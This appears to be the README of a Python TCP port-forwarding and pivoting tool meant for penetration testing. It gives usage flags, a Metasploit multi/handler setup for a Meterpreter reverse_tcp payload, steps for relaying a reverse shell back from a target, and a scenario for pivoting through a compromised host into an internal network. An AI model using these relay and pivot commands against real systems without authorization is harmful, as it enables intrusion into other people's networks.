# 🔀 PY-FWD v3.0 — Advanced TCP Port Forwarder

```
  ██████╗ ██╗   ██╗      ███████╗██╗    ██╗██████╗
  ██╔══██╗╚██╗ ██╔╝      ██╔════╝██║    ██║██╔══██╗
  ██████╔╝ ╚████╔╝ █████╗█████╗  ██║ █╗ ██║██║  ██║
  ██╔═══╝   ╚██╔╝  ╚════╝██╔══╝  ██║███╗██║██║  ██║
  ██║        ██║         ██║     ╚███╔███╔╝██████╔╝
  ╚═╝        ╚═╝         ╚═╝      ╚══╝╚══╝ ╚═════╝
```

> A hacker-style TCP port forwarding / pivoting tool built in Python.  
> Single-port, multi-port, live stats, file logging, and full **Metasploit / msfconsole** compatibility.

---

## 📋 Table of Contents

- [Features](#-features)
- [Requirements](#-requirements)
- [Installation](#-installation)
- [Usage](#-usage)
  - [Single-Port Mode](#single-port-mode)
  - [Multi-Port Mode](#multi-port-mode)
  - [All Flags](#all-flags)
- [Metasploit Integration](#-metasploit-integration)
- [Pivoting Example](#-pivoting-example)
- [Disclaimer](#-disclaimer)

---

## ✨ Features

| Feature | Description |
|---|---|
| 🔀 **Single-Port Forward** | Forward one local port to any remote host/port |
| 🔀 **Multi-Port Forward** | Forward multiple ports in one command |
| 🖥️ **Hacker-Style UI** | ANSI colored terminal output with ASCII banner |
| 📊 **Live Stats** | Real-time session count and bytes transferred |
| 📝 **File Logging** | Save all activity to a log file |
| 🧨 **MSF Hint Mode** | Prints ready-to-paste Metasploit handler commands |
| ⚙️ **Configurable** | Adjustable buffer size, timeout, bind address |
| 🛑 **Clean Shutdown** | Graceful Ctrl+C with proper socket teardown |

---

## 📦 Requirements

- Python **3.6+**
- No external libraries — **stdlib only**

---

## 🚀 Installation

```bash
git clone https://github.com/Klodi666/py-fwd
cd py-fwd
chmod +x portfwd.py
```

No pip installs needed. Just Python 3.

---

## 📖 Usage

### Single-Port Mode

Forward all traffic arriving on local port `4444` to `127.0.0.1:5555`:

```bash
python3 portfwd.py --lport 4444 --rhost 127.0.0.1 --rport 5555
```

With verbose output and logging:

```bash
python3 portfwd.py --lport 4444 --rhost 127.0.0.1 --rport 5555 -v --logfile session.log
```

---

### Multi-Port Mode

Forward multiple ports in a single command using the `--multi` flag.

**Format:** `LPORT:RHOST/RPORT[,LPORT:RHOST/RPORT,...]`

```bash
python3 portfwd.py --multi 4444:127.0.0.1/5555,8080:10.0.0.1/80
```

This starts two listeners simultaneously:
- `:4444` → `127.0.0.1:5555`
- `:8080` → `10.0.0.1:80`

---

### All Flags

```
Single-Port Mode:
  --lhost HOST     Local bind address (default: 0.0.0.0)
  --lport PORT     Local port to listen on
  --rhost HOST     Remote host to forward to
  --rport PORT     Remote port to forward to

Multi-Port Mode:
  --multi RULES    e.g. 4444:127.0.0.1/5555,8080:10.0.0.1/80

Options:
  -v, --verbose    Print every forwarded data chunk
  --logfile FILE   Save log output to file
  --timeout SEC    Socket timeout in seconds (default: 60)
  --bufsize BYTES  Receive buffer size (default: 4096)
  --stats          Print live stats every 10 seconds
  --msf            Show Metasploit handler setup commands
  --no-color       Disable ANSI color output
```

---

## 🧨 Metasploit Integration

PY-FWD is designed to work as a relay between a target machine and a Metasploit listener. Use the `--msf` flag to print ready-to-paste msfconsole commands.

```bash
python3 portfwd.py --lport 4444 --rhost 127.0.0.1 --rport 4444 --msf
```

This will print something like:

```
┌─ MSF HANDLER (run in msfconsole) ─────────────────────┐
  use exploit/multi/handler
  set PAYLOAD windows/x64/meterpreter/reverse_tcp
  set LHOST 0.0.0.0
  set LPORT 4444
  set ExitOnSession false
  exploit -j
└────────────────────────────────────────────────────────┘
```

### Step-by-step MSF workflow

**Step 1** — Start the forwarder on your machine (the relay point):

```bash
python3 portfwd.py --lport 4444 --rhost 127.0.0.1 --rport 4444 --msf -v
```

**Step 2** — Start your Metasploit listener in `msfconsole`:

```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
exploit -j
```

**Step 3** — Execute your payload on the target, pointing it back to your forwarder machine. The shell will be relayed through to MSF automatically.

---

## 🌐 Pivoting Example

Use PY-FWD to expose an internal network service through a compromised host.

**Scenario:** You have access to `10.10.10.5` (pivot host) and want to reach an internal web server at `192.168.1.100:80` from your attacker machine.

```
[Attacker :8080] ←──── [Pivot Host: portfwd.py] ────→ [192.168.1.100:80]
```

On the pivot host:

```bash
python3 portfwd.py --lport 8080 --rhost 192.168.1.100 --rport 80 --stats
```

Now browse to `http://PIVOT_HOST:8080` on your attacker machine to reach the internal server.

---

## ⚠️ Disclaimer

This tool is intended for **authorized penetration testing, CTF competitions, and educational use only**.  
Do not use against systems you do not own or have explicit written permission to test.  
The author is not responsible for any misuse or damage caused by this tool.

---

## 📄 License

MIT License — see `LICENSE` for details.
